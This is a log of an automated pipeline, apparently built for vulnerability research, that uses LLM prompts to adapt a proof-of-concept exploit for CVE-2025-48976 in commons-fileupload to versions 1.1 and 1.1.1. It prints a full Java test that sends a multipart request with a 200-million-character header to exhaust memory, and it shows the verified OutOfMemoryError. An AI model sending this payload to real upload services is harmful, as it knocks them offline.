Running main_process.py for CVE: CVE-2025-48976
Versions: 1.1.1

[1m[Main] === Starting adaptation process for CVE-2025-48976 ===[0m
[96m[Processor] Fetching all available Maven versions...[0m
[96m[Analyzer] Loading cached versions from: /PoCAdaptation/library/commons-fileupload_commons-fileupload.txt[0m
[96m[Analyzer] commons-fileupload:commons-fileupload has 12 versions (cached).[0m
[96m[Processor] Identifying versions with successful reproduction...[0m
[96m[Processor] Pending versions: ['1.1', '1.1.1'][0m
[92m[Preparer] Created pending directory: /PoCAdaptation/exploit/pending/CVE-2025-48976[0m
[92m[Main] Total affected versions: 12[0m
[92m[Main] Already reproduced versions: 10[0m
[93m[Main] Versions pending adaptation: 2[0m
[96m[Main]     -> ['1.1', '1.1.1'][0m
[96m[Main]     -> ['1.2', '1.2.1', '1.2.2', '1.3', '1.3.1', '1.3.2', '1.3.3', '1.4', '1.5', '1.6.0'][0m
[96m[Executor] Running initial exploit mvn test in /PoCAdaptation/exploit/origin/CVE-2025-48976/exploit[0m
[91m[Executor] Initial exploit execution finished with return code 1[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.OutOfMemoryError'[0m
[92m[Verifier] âœ“ Detail matched: 'OutOfMemory'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Verifier] Initial exploit behavior verified successfully.[0m
[96m[Selector] Nearest need adapatation version selected: 1.1.1[0m
[96m[Selector] Closest reproduced version: 1.2 at index 2[0m
[96m[Adapter] Trying next closest version: 1.1.1[0m
[96m[Preparer] Using exploit from origin: /PoCAdaptation/exploit/origin/CVE-2025-48976/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-48976/1.1.1/exploit[0m
[96m[Preparer] Updating dependency version to 1.1.1 in /PoCAdaptation/exploit/pending/CVE-2025-48976/1.1.1/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 1.1.1 in /PoCAdaptation/exploit/pending/CVE-2025-48976/1.1.1/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 1.1.1...[0m
[96m[Executor] Executing exploit for CVE-2025-48976 on version 1.1.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.OutOfMemoryError'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 1.2 to 1.1.1...[0m
[96m[Adapter] Start adapting exploit from 1.2 to 1.1.1"[0m
[96m[Executor] Executing exploit for CVE-2025-48976 on version 1.1.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.OutOfMemoryError'[0m
[91m[Executor] Reproduction result: Failure[0m
[ErrorManager] Extracting errors from log with 11 lines.
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2016-1000031: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-48976/1.1.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,15] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method setFileSizeMax(int)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable upload of type org.apache.commons.fileupload.servlet.ServletFileUpload[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1988 (prompt), 1 (completion), 1989 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 1.1.1:commons-fileupload:commons-fileupload.
This test file compiles and runs successfully with version 1.2.

Your task is to:
1. Analyze why this issue occurs with the *1.2* but not with the *1.1.1 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[WARNING] 
[WARNING] Some problems were encountered while building the effective model for edu.vision.se:CVE-2016-1000031:jar:1.0-SNAPSHOT
[WARNING] 'dependencies.dependency.(groupId:artifactId:type:classifier)' must be unique: junit:junit:jar -> duplicate declaration of version 4.13.2 @ line 40, column 119
[WARNING] 'dependencies.dependency.(groupId:artifactId:type:classifier)' must be unique: junit:junit:jar -> duplicate declaration of version 4.13.2 @ line 40, column 223
[WARNING] 'dependencies.dependency.(groupId:artifactId:type:classifier)' must be unique: junit:junit:jar -> duplicate declaration of version 4.13.2 @ line 40, column 327
[WARNING] 
[WARNING] It is highly recommended to fix these problems because they threaten the stability of your build.
[WARNING] 
[WARNING] For this reason, future Maven versions might no longer support building such malformed projects.
[WARNING] 
[INFO] 
[INFO] -------------------< edu.vision.se:CVE-2016-1000031 >-------------------
[INFO] Building commons-fileupload CVE-2016-1000031 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2016-1000031 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2025-48976/1.1.1/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2016-1000031 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-48976/1.1.1/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2016-1000031 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2016-1000031 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-48976/1.1.1/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2016-1000031 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2025-48976/1.1.1/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-48976/1.1.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,15] cannot find symbol
  symbol:   method setFileSizeMax(int)
  location: variable upload of type org.apache.commons.fileupload.servlet.ServletFileUpload
[INFO] 1 error
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.871 s
[INFO] Finished at: 2025-09-25T07:43:39Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2016-1000031: Compilation failure
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-48976/1.1.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,15] cannot find symbol
[ERROR]   symbol:   method setFileSizeMax(int)
[ERROR]   location: variable upload of type org.apache.commons.fileupload.servlet.ServletFileUpload
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <groupId>edu.vision.se</groupId><version>1.0-SNAPSHOT</version><modelVersion>4.0.0</modelVersion>
  <artifactId>CVE-2016-1000031</artifactId>
  <name>commons-fileupload CVE-2016-1000031</name>

  <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <spring.version>4.2.9.RELEASE</spring.version>
    </properties>



  <dependencies>
    <dependency>
      <groupId>commons-fileupload</groupId>
      <artifactId>commons-fileupload</artifactId>
      <version>1.1.1</version>
    </dependency>
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-test</artifactId>
      <version>5.3.30</version> <!-- æˆ–ä¸Žä½ çš„é¡¹ç›®å…¼å®¹çš„ç‰ˆæœ¬ -->
      <scope>test</scope>
    </dependency>
    
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-web</artifactId>
      <version>5.3.30</version>
      <scope>test</scope>
    </dependency>
    <dependency>
    <groupId>javax.servlet</groupId>
    <artifactId>javax.servlet-api</artifactId>
    <version>4.0.1</version>
    <scope>provided</scope>
  </dependency>
  <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency><dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency><dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency><dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency></dependencies>
  <build>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-surefire-plugin</artifactId>
        <version>3.2.5</version>
        <configuration>
          <argLine>-Xmx256m</argLine>
        </configuration>
      </plugin>
    </plugins>
  </build>
</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[Adapter] Grouped Errors: {'cannot find symbol | method setFileSizeMax(int)': [{'file': '/PoCAdaptation/exploit/result/CVE-2025-48976/1.1.1/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 39, 'column': 15, 'message': 'cannot find symbol', 'symbol': 'method setFileSizeMax(int)', 'location': 'variable upload of type org.apache.commons.fileupload.servlet.ServletFileUpload', 'code_line': '        upload.setFileSizeMax(-1);'}]}
[LLMClient] Tokens used: 145 (prompt), 6 (completion), 151 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 1.1.1: 

Error: cannot find symbol, method setFileSizeMax(int), variable upload of type org.apache.commons.fileupload.servlet.ServletFileUpload 

The test executes as expected in 1.2 

Error code:         upload.setFileSizeMax(-1); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
upload;setFileSizeMax
[96m[ErrorManager] Extracted key entities: ['upload', 'setFileSizeMax'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2025-48976/1.1.1/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 39, 'column': 15, 'message': 'cannot find symbol', 'symbol': 'method setFileSizeMax(int)', 'location': 'variable upload of type org.apache.commons.fileupload.servlet.ServletFileUpload', 'code_line': '        upload.setFileSizeMax(-1);'} with cause: ['upload', 'setFileSizeMax'][0m
[96m[Adapter] Related diffs for error: [(48, 6.0), (40, 5.0), (97, 5.0), (106, 5.0), (128, 5.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | method setFileSizeMax(int) cause: ['upload', 'setFileSizeMax'][0m
[96m[RepairModule] Trying best diff #48 with score 6.00[0m
[LLMClient] Tokens used: 755 (prompt), 377 (completion), 1132 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 1.1.1:commons-fileupload:commons-fileupload.
This test file compiles and runs successfully in 1.2.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 1.2 to 1.1.1.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: method setFileSizeMax(int), location: variable upload of type org.apache.commons.fileupload.servlet.ServletFileUpload

### Error Position:
        upload.setFileSizeMax(-1);

### Related Diff:
Operation: MODIFIED, File: src/java/org/apache/commons/fileupload/FileUploadBase.java, Hunk: @@ -208,9 +219,11 @@ public long getSizeMax() {


     /**
+     * Sets the maximum allowed upload size. If negative, there is no maximum.
-     * Sets the maximum allowed size of a complete request, as opposed
-     * to {@link #setFileSizeMax(long)}.
      *
+     * @param sizeMax The maximum allowed size, in bytes, or -1 for no maximum.
-     * @param sizeMax The maximum allowed size, in bytes. The default value of
-     *   -1 indicates, that there is no limit.
      *
      * @see #getSizeMax()
      *

### Test File Content:
package edu.vision.se;

import org.junit.Test;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.fail;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.servlet.ServletFileUpload;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.FileUploadBase;

import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;

public class Testcase1 {

    @Test
    public void testPartHeaderSizeMaxLimit()
            throws IOException, FileUploadException {
        int headerSize = 200_000_000;
        StringBuilder sb = new StringBuilder(headerSize + 200);
        sb.append("-----1234\r\n");
        sb.append("X-Long-Header: ");
        for (int i = 0; i < headerSize; i++) sb.append('A');
        sb.append("\r\n");
        sb.append("Content-Disposition: form-data; name=\"file\"; filename=\"foo\"\r\n");
        sb.append("Content-Type: text/plain\r\n\r\n");
        sb.append("body\r\n");
        sb.append("-----1234--\r\n");

        String request = sb.toString();

        final ServletFileUpload upload = new ServletFileUpload(new DiskFileItemFactory());
        upload.setFileSizeMax(-1);
        upload.setSizeMax(-1);

        MockHttpServletRequest req = new MockHttpServletRequest();
        req.setContent(request.getBytes("US-ASCII"));
        req.setContentType("multipart/form-data; boundary=---1234");
        upload.parseRequest(req);
    }
}


[LLMClient] Response: 
```java
package edu.vision.se;

import org.junit.Test;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.fail;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.servlet.ServletFileUpload;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.FileUploadBase;

import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;

public class Testcase1 {

    @Test
    public void testPartHeaderSizeMaxLimit()
            throws IOException, FileUploadException {
        int headerSize = 200_000_000;
        StringBuilder sb = new StringBuilder(headerSize + 200);
        sb.append("-----1234\r\n");
        sb.append("X-Long-Header: ");
        for (int i = 0; i < headerSize; i++) sb.append('A');
        sb.append("\r\n");
        sb.append("Content-Disposition: form-data; name=\"file\"; filename=\"foo\"\r\n");
        sb.append("Content-Type: text/plain\r\n\r\n");
        sb.append("body\r\n");
        sb.append("-----1234--\r\n");

        String request = sb.toString();

        final ServletFileUpload upload = new ServletFileUpload(new DiskFileItemFactory());
        upload.setSizeMax(-1);
        upload.setSizeMax(-1);

        MockHttpServletRequest req = new MockHttpServletRequest();
        req.setContent(request.getBytes("US-ASCII"));
        req.setContentType("multipart/form-data; boundary=---1234");
        upload.parseRequest(req);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2025-48976/1.1.1/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2025-48976 on version 1.1.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.OutOfMemoryError'[0m
[92m[Verifier] âœ“ Detail matched: 'OutOfMemory'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[RepairModule] Repair success![0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2025-48976 on version 1.1.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.OutOfMemoryError'[0m
[92m[Verifier] âœ“ Detail matched: 'OutOfMemory'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Adapter] Adaptation from 1.2 to 1.1.1 successful.[0m
[Adapt] âœ“ Completed: True
[96m[Adapter] Adaptation complete. Retesting exploit on 1.1.1...[0m
[92m[Executor] Adaptation + reproduction successful on 1.1.1[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-48976/1.1.1[0m
[96m[Selector] Nearest need adapatation version selected: 1.1[0m
[96m[Selector] Closest reproduced version: 1.1.1 at index 1[0m
[96m[Adapter] Trying next closest version: 1.1[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-48976/1.1.1/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-48976/1.1/exploit[0m
[96m[Preparer] Updating dependency version to 1.1 in /PoCAdaptation/exploit/pending/CVE-2025-48976/1.1/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 1.1 in /PoCAdaptation/exploit/pending/CVE-2025-48976/1.1/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 1.1...[0m
[96m[Executor] Executing exploit for CVE-2025-48976 on version 1.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.OutOfMemoryError'[0m
[92m[Verifier] âœ“ Detail matched: 'OutOfMemory'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 1.1[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-48976/1.1[0m
[93m[Selector] No pending versions available.[0m
[91m[Main] No suitable version found for further adaptation. Stopping.[0m
[1m[Main] === Adaptation process complete ===[0m
[92m[Main] Total reproduced versions: 12[0m

[Executor] â–¶ Summary of return codes:
  - Version 1.1.1: âœ“ Success (exit code 0)
